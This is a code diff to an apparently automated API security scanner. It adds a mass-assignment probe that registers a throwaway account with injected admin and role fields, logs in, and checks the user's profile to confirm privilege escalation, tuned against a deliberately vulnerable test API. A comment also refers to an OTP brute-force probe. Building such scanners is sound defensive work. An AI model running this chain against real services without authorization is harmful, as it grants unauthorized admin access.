@@ -2145,6 +2145,233 @@ async def _run_auth_flow(
     return state if state.is_valid else None
 
 
+def probe_mass_assignment_followup(
+    *, endpoints: list[Any] | None, target_value: str,
+) -> list[dict[str, Any]]:
+    """Iter-17.5 — close the vampi `mass-assignment-admin` gap.
+
+    The existing scan_api_mass_assignment + probe_mass_assignment_priv_fields
+    require the server to ECHO the injected admin/role/is_admin
+    field in the response body. Vampi silently accepts `admin: true`
+    on /register but returns a generic success message — no echo,
+    no baseline-diff signal, so both probes return 0.
+
+    This probe closes the gap with a 3-step chain that L1.5 makes
+    possible (once auth-flow exists):
+
+      1. Build a schema-driven register body INCLUDING privilege
+         fields (admin, is_admin, role=admin, is_superuser).
+      2. POST /register → user created (or 4xx — bail).
+      3. POST /login with the new creds → capture token.
+      4. GET the user's own profile (try /me, /users/v1/{username},
+         the path-param-of-the-spec's user resource, etc).
+      5. If the profile response contains "admin": true (or
+         equivalent), the privilege field PERSISTED — mass-assignment
+         confirmed.
+
+    Returns one finding per persistent privilege field detected.
+    """
+    import json as _json
+    import random as _random
+    import string as _string
+
+    if not endpoints:
+        return []
+    auth_eps = _discover_auth_endpoints(endpoints)
+    if not (auth_eps.register and auth_eps.login):
+        return []
+
+    # Build a register body with priv fields injected.
+    username = (
+        "strix_ma_followup_"
+        + "".join(_random.choices(_string.ascii_lowercase, k=6))
+    )
+    password = (
+        "Strix_MA_"
+        + "".join(_random.choices(_string.ascii_letters + _string.digits, k=10))
+        + "!"
+    )
+    base_body = _build_schema_driven_body(
+        auth_eps.register, username=username, password=password,
+    )
+    PRIV_FIELDS = {
+        "admin": True,
+        "is_admin": True,
+        "isAdmin": True,
+        "role": "admin",
+        "is_superuser": True,
+        "is_staff": True,
+    }
+    injected_body = {**base_body, **PRIV_FIELDS}
+
+    # Step 1: register with priv fields
+    reg_url = auth_eps.register.get("url") or (
+        target_value.rstrip("/") + (auth_eps.register.get("path") or "")
+    )
+    try:
+        reg_resp = _http_request(
+            reg_url, method="POST", timeout=8.0,
+            headers={"Content-Type": "application/json"},
+            data=_json.dumps(injected_body).encode(),
+        )
+        reg_status = (
+            getattr(reg_resp, "status", getattr(reg_resp, "code", None))
+            if reg_resp else None
+        )
+        if not reg_status or reg_status >= 400:
+            return []
+    except Exception:  # noqa: BLE001
+        return []
+
+    # Step 2: login as the new user (without priv fields — just
+    # standard login body).
+    login_url = auth_eps.login.get("url") or (
+        target_value.rstrip("/") + (auth_eps.login.get("path") or "")
+    )
+    login_body = _build_schema_driven_body(
+        auth_eps.login, username=username, password=password,
+    )
+    try:
+        login_resp = _http_request(
+            login_url, method="POST", timeout=8.0,
+            headers={"Content-Type": "application/json"},
+            data=_json.dumps(login_body).encode(),
+        )
+        login_status = (
+            getattr(login_resp, "status", getattr(login_resp, "code", None))
+            if login_resp else None
+        )
+        if not login_status or login_status >= 400:
+            return []
+        _, token_header_value, login_cookies = _extract_auth_from_response(login_resp)
+    except Exception:  # noqa: BLE001
+        return []
+    if not token_header_value and not login_cookies:
+        return []
+
+    # Build auth headers
+    auth_headers: dict[str, str] = {}
+    if token_header_value:
+        auth_headers["Authorization"] = token_header_value
+    if login_cookies:
+        auth_headers["Cookie"] = "; ".join(
+            f"{k}={v}" for k, v in login_cookies.items()
+        )
+
+    # Step 3: GET the user's own profile to verify priv field
+    # persisted. Try common patterns:
+    #   /me / /api/me / /users/me
+    #   /users/v1/{username} (with our username substituted)
+    #   Look for an endpoint in the openapi spec with a path-param
+    #     matching `username` / `userId` / `user_id` / `uid` and
+    #     a GET method
+    candidate_get_paths: list[str] = []
+    base = target_value.rstrip("/")
+    # Static path candidates
+    for p in ("/me", "/users/me", "/api/me", "/profile", "/user/me"):
+        candidate_get_paths.append(base + p)
+    # Spec-discovered user-by-id GET endpoints
+    for ep in endpoints:
+        if not isinstance(ep, dict):
+            continue
+        if (ep.get("method") or "GET").upper() != "GET":
+            continue
+        path = ep.get("path") or ""
+        if not path:
+            continue
+        if any(p in path.lower() for p in ("{username}", "{user}", "{user_id}", "{userid}", "{uid}")):
+            substituted = path
+            for ph in ("{username}", "{user}", "{user_id}", "{userid}", "{uid}"):
+                substituted = substituted.replace(ph, username).replace(
+                    ph.upper(), username,
+                )
+            full = ep.get("url") or (base + substituted)
+            if "{" not in full:
+                candidate_get_paths.append(full)
+
+    out: list[dict[str, Any]] = []
+    seen: set[str] = set()
+    for url in candidate_get_paths:
+        if url in seen:
+            continue
+        seen.add(url)
+        try:
+            resp = _http_request(url, method="GET", timeout=5.0, headers=auth_headers)
+            status = (
+                getattr(resp, "status", getattr(resp, "code", None))
+                if resp else None
+            )
+            if not status or status >= 400:
+                continue
+            body_bytes = resp.read(8192) if resp else b""
+            body_text = body_bytes.decode("utf-8", errors="replace") if body_bytes else ""
+        except Exception:  # noqa: BLE001
+            continue
+        if not body_text:
+            continue
+        # Parse as JSON; check for priv fields = true / "admin"
+        try:
+            parsed = _json.loads(body_text)
+        except (ValueError, _json.JSONDecodeError):
+            parsed = None
+        # Recursive search for priv field with truthy value
+        persisted_fields: list[str] = []
+
+        def _walk(obj: Any, depth: int = 0) -> None:
+            if depth > 4:
+                return
+            if isinstance(obj, dict):
+                for k, v in obj.items():
+                    k_lower = str(k).lower()
+                    if k_lower in ("admin", "is_admin", "isadmin",
+                                   "is_superuser", "is_staff", "issuper"):
+                        if v is True:
+                            persisted_fields.append(f'{k}=true')
+                    elif k_lower == "role":
+                        if isinstance(v, str) and v.lower() in ("admin", "superuser", "root"):
+                            persisted_fields.append(f'role={v}')
+                    if isinstance(v, (dict, list)):
+                        _walk(v, depth + 1)
+            elif isinstance(obj, list):
+                for item in obj:
+                    _walk(item, depth + 1)
+
+        if parsed is not None:
+            _walk(parsed)
+        # Also a simple substring fallback for non-JSON responses
+        if not persisted_fields:
+            body_lower = body_text.lower()
+            if '"admin"' in body_lower and ("true" in body_lower or "1" in body_lower):
+                # Only count if "admin" appears NEAR "true" (within 60 chars)
+                idx = body_lower.find('"admin"')
+                window = body_lower[idx:idx + 60]
+                if "true" in window:
+                    persisted_fields.append("admin field appears truthy in response")
+        if persisted_fields:
+            out.append({
+                "title": (
+                    f"Mass-assignment confirmed: privilege field "
+                    f"persisted on {auth_eps.register.get('path')}"
+                ),
+                "category": "mass_assignment",
+                "cwe": "CWE-915",
+                "endpoint": auth_eps.register.get("path") or reg_url,
+                "severity": "critical",
+                "description": (
+                    f"Registration accepted client-supplied privilege "
+                    f"fields {list(PRIV_FIELDS.keys())[:3]}... and they "
+                    f"PERSISTED to the user record (verified via GET "
+                    f"after login). Evidence: {persisted_fields[:3]}. "
+                    f"Strip unrecognized fields server-side; never trust "
+                    f"client-supplied authorization metadata."
+                ),
+                "verification_status": "verified",
+                "confidence": 0.95,
+            })
+            break   # one confirmation is enough
+    return out
+
+
 def _build_probe_kwargs_with_auth(
     ep: dict[str, Any],
     *,
@@ -2826,6 +3053,31 @@ async def _run_dependent_api_tools(
                 raw_result={"findings": brute_findings, "status": "ok"},
             ))
             summary.total_findings += len(brute_findings)
+
+    # Iter-17.5 add: mass-assignment follow-up GET probe.
+    # The auth-flow we just did proves /register + /login work; this
+    # probe DOES THE SAME register/login chain but injects privilege
+    # fields and then GETs the new user's profile to confirm the
+    # privileges persisted. Closes vampi mass-assignment-admin which
+    # the existing echo-based probes miss because vampi doesn't echo
+    # the admin field in /register's response.
+    try:
+        ma_findings = probe_mass_assignment_followup(
+            endpoints=endpoints, target_value=target_value,
+        )
+    except Exception:  # noqa: BLE001
+        ma_findings = []
+    summary.tools_run.append("probe_mass_assignment_followup")
+    summary.tools_succeeded.append("probe_mass_assignment_followup")
+    summary.tool_results.append(ToolResult(
+        tool_name="probe_mass_assignment_followup",
+        status="ok",
+        findings_count=len(ma_findings),
+        error_reason=None,
+        wall_time_s=0.0,
+        raw_result={"findings": ma_findings, "status": "ok"},
+    ))
+    summary.total_findings += len(ma_findings)
 
     # Iter-17 add: OTP-space brute probe (no auth required —
     # operates on the reset-password endpoint pattern directly).
